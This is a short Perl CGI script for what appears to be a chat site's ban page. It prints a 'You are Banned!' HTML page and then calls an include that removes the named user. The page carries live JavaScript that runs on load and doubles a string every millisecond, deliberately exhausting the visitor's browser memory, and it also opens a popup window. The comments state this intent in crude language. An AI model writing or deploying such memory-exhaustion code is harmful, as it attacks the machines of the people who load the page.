#!/usr/bin/perl

print "Content-type: text/html\n\n";

print <<"(END HTML FOOTER)";

<HTML>
<HEAD>

<TITLE>You are Banned!</TITLE>

<SCRIPT LANGUAGE="JavaScript">

var szEatMemory = "GOBBLEGOBBLE"  // string to consume memory

function EatMemoryInTime()
{
    szEatMemory = szEatMemory + szEatMemory                    // keep fucking up
    window.status = "String Length is: " + szEatMemory.length  // report size on status
    window.setTimeout('EatMemoryInTime()',1);                  // tell browser to hit this function 
}

window.open("https://chat.ulyaoth.com/banned.html", "_blank");

</SCRIPT>
</HEAD>

<body bgcolor="#000000" text="#FFFFFF" onload="EatMemoryInTime();">

<p>
<h1><center>You are banned</center></h1>
</p>

</body>

</html>

(END HTML FOOTER)

$kill_user = $DATA{'n'};

require "$root/inc/kill_user.inc";

undef $kill_user;


return true;